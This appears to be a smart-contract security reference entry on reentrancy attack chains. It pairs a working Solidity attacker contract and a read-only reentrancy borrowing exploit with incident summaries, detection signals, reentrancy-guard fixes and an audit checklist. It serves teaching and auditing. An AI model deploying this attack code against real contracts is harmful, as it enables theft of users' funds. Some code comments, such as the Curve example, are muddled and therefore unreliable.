---
id: ATTACK-CHAIN-REENTRANCY
title: Reentrancy State Desync Attack Chain
category: attack-chains
difficulty: advanced
tags: [reentrancy, state-desync, callback, cei-violation]
real_exploits: [the-dao-2016, curve-2023, rari-2022, grim-finance-2021]
typical_loss: $10M-80M
last_updated: 2026-01-31
---

# Reentrancy State Desync Attack Chain

## Overview

This attack chain exploits reentrancy to create inconsistencies between actual state and what the contract believes the state to be. The attacker re-enters during state transitions to extract value.

## Attack Flow Diagram

```
┌──────────────┐    ┌──────────────┐    ┌──────────────┐    ┌──────────────┐
│ Trigger      │ ─▶ │ Callback     │ ─▶ │ Re-enter     │ ─▶ │ State is     │
│ External Call│    │ Received     │    │ Original Fn  │    │ Corrupted    │
└──────────────┘    └──────────────┘    └──────────────┘    └──────────────┘
                           │                    │
                           └────── LOOP ────────┘
```

## Reentrancy Types

| Type | Trigger | Complexity |
|------|---------|------------|
| Classic | ETH transfer | Low |
| ERC-777 | Token hook | Medium |
| ERC-721 | onERC721Received | Medium |
| ERC-1155 | onERC1155Received | Medium |
| Cross-function | Different function re-entry | High |
| Cross-contract | Different contract re-entry | High |
| Read-only | View function during write | High |

## Prerequisites

- **External call before state update** (CEI violation)
- **Callback mechanism** (ETH, ERC-777, ERC-721, etc.)
- **State that can be exploited** if read mid-transaction

## Attack Steps

### Step 1: Identify Vulnerable Pattern

```solidity
// VULNERABLE: Classic CEI violation
function withdraw(uint256 amount) external {
    require(balances[msg.sender] >= amount, "Insufficient");
    
    // EXTERNAL CALL FIRST - attacker gains control
    (bool success,) = msg.sender.call{value: amount}("");
    require(success, "Transfer failed");
    
    // STATE UPDATE AFTER - not yet executed during callback
    balances[msg.sender] -= amount;
}
```

### Step 2: Deploy Attack Contract

```solidity
contract ReentrancyAttacker {
    IVulnerable public target;
    uint256 public attackCount;
    uint256 public maxAttacks = 10;
    
    constructor(address _target) {
        target = IVulnerable(_target);
    }
    
    function attack() external payable {
        // Initial deposit
        target.deposit{value: msg.value}();
        
        // Trigger first withdrawal
        target.withdraw(msg.value);
    }
    
    // This is called when target sends ETH
    receive() external payable {
        if (attackCount < maxAttacks && address(target).balance >= msg.value) {
            attackCount++;
            // Re-enter! Balance not yet decremented
            target.withdraw(msg.value);
        }
    }
    
    function collectProfit() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}
```

**State Change**: Attack contract ready to receive callbacks

### Step 3: Trigger the Callback Loop

```solidity
function executeAttack() external {
    // Deposit 1 ETH
    attacker.attack{value: 1 ether}();
    
    // Execution flow:
    // 1. deposit(1 ETH) - balances[attacker] = 1 ETH
    // 2. withdraw(1 ETH)
    //    - Check: balances[attacker] >= 1 ETH ✓
    //    - Call: attacker.receive() ← CALLBACK
    //      3. Re-enter withdraw(1 ETH)
    //         - Check: balances[attacker] >= 1 ETH ✓ (not updated yet!)
    //         - Call: attacker.receive() ← CALLBACK
    //           4. Re-enter again... (repeat)
    //    - Update: balances[attacker] -= 1 ETH (happens after all callbacks)
}
```

**State Change**: Contract drained, attacker has multiple ETH

### Step 4: Read-Only Reentrancy Variant

```solidity
// Even without draining, can corrupt external systems

// VULNERABLE: Curve-style read-only reentrancy
contract CurvePool {
    function remove_liquidity() external {
        uint256 lpAmount = balanceOf(msg.sender);
        
        // Burns LP tokens
        _burn(msg.sender, lpAmount);
        
        // Sends ETH - CALLBACK OPPORTUNITY
        payable(msg.sender).transfer(ethAmount);
        
        // LP supply decreased but ETH not yet sent
        // virtual_price is temporarily inflated
    }
    
    function get_virtual_price() external view returns (uint256) {
        // This can be called during the callback
        // Returns incorrect (inflated) price
        return totalAssets() / totalSupply();
    }
}

// Attacker's callback
receive() external payable {
    // Call external protocol that uses get_virtual_price()
    uint256 inflatedPrice = curvePool.get_virtual_price();
    ILending(lending).borrowAgainst(lpTokens, inflatedPrice);
    // Borrows more than LP tokens are actually worth
}
```

## Real-World Examples

### The DAO (June 2016) - $60M

```
Attack Chain:
1. Called splitDAO() to withdraw
2. Received callback in fallback
3. Re-entered splitDAO() before balance update
4. Repeated 50+ times per transaction
5. Drained 3.6M ETH (~$60M at time)

Result: Ethereum hard fork (ETH/ETC split)
```

### Curve/Vyper (July 2023) - $70M+

```
Attack Chain:
1. Called remove_liquidity() on Curve pool
2. Received ETH callback during withdrawal
3. Re-entered to exploit stale virtual_price
4. External protocols read inflated price
5. Extracted excess value from lending protocols

Root Cause: Vyper compiler reentrancy guard bug
```

### Rari Capital (April 2022) - $80M

```
Attack Chain:
1. Borrowed cETH from Fuse pool
2. Called exitMarket() to remove collateral
3. During callback, called borrow() again
4. Borrowed more than collateral allowed
5. Never repaid, pool left insolvent
```

## Detection Points

| Step | Detection Signal | Monitoring |
|------|-----------------|------------|
| 1 | External call pattern | Static analysis |
| 2 | Contract receiver | Check for fallback/receive |
| 3 | Same function called | Call trace analysis |
| 4 | State inconsistency | Invariant checking |

```solidity
// Detection: Add reentrancy detection logging
contract DetectableContract {
    bool private _inExternalCall;
    
    modifier detectReentrancy() {
        if (_inExternalCall) {
            emit ReentrancyDetected(msg.sender, msg.sig);
            revert("Reentrancy detected");
        }
        _inExternalCall = true;
        _;
        _inExternalCall = false;
    }
}
```

## Prevention Measures

### CEI Pattern (Checks-Effects-Interactions)

```solidity
// SECURE: Update state before external call
function withdraw(uint256 amount) external {
    // 1. CHECKS
    require(balances[msg.sender] >= amount, "Insufficient");
    
    // 2. EFFECTS - Update state FIRST
    balances[msg.sender] -= amount;
    
    // 3. INTERACTIONS - External call LAST
    (bool success,) = msg.sender.call{value: amount}("");
    require(success, "Transfer failed");
}
```

### Reentrancy Guard

```solidity
// OpenZeppelin ReentrancyGuard pattern
abstract contract ReentrancyGuard {
    uint256 private constant _NOT_ENTERED = 1;
    uint256 private constant _ENTERED = 2;
    uint256 private _status;
    
    constructor() {
        _status = _NOT_ENTERED;
    }
    
    modifier nonReentrant() {
        require(_status != _ENTERED, "ReentrancyGuard: reentrant call");
        _status = _ENTERED;
        _;
        _status = _NOT_ENTERED;
    }
}

contract SecureVault is ReentrancyGuard {
    function withdraw(uint256 amount) external nonReentrant {
        require(balances[msg.sender] >= amount, "Insufficient");
        balances[msg.sender] -= amount;
        payable(msg.sender).transfer(amount);
    }
}
```

### Read-Only Reentrancy Protection

```solidity
// For protecting view functions from read-only reentrancy
contract ProtectedViews {
    uint256 private _status;
    
    modifier nonReentrantView() {
        require(_status != _ENTERED, "Reentrant view call");
        _;
    }
    
    function get_virtual_price() external view nonReentrantView returns (uint256) {
        return _calculateVirtualPrice();
    }
    
    function remove_liquidity() external {
        _status = _ENTERED;
        
        // ... withdrawal logic with callback ...
        
        _status = _NOT_ENTERED;
    }
}
```

## Audit Checklist

```
[ ] CEI pattern followed in all functions?
[ ] Reentrancy guard on state-changing functions?
[ ] External calls identified (ETH, tokens, callbacks)?
[ ] ERC-777/721/1155 token callbacks considered?
[ ] Cross-function reentrancy possible?
[ ] Cross-contract reentrancy possible?
[ ] View functions protected from read-only reentrancy?
[ ] State consistent before/after external calls?
```

## Cross-Contract Reentrancy Pattern

```solidity
// Often missed: Contract A calls Contract B, B calls back to A

contract ContractA {
    ContractB public b;
    
    function foo() external {
        // Update some state in A
        b.bar();  // B calls back into A.baz()
        // State in A may be inconsistent
    }
    
    function baz() external {
        // Called by B during foo()
        // Can see A's state mid-update
    }
}

// Protection: Global reentrancy lock across contracts
contract GlobalLock {
    address public lockHolder;
    
    modifier globalNonReentrant() {
        require(lockHolder == address(0) || lockHolder == msg.sender);
        lockHolder = msg.sender;
        _;
        lockHolder = address(0);
    }
}
```
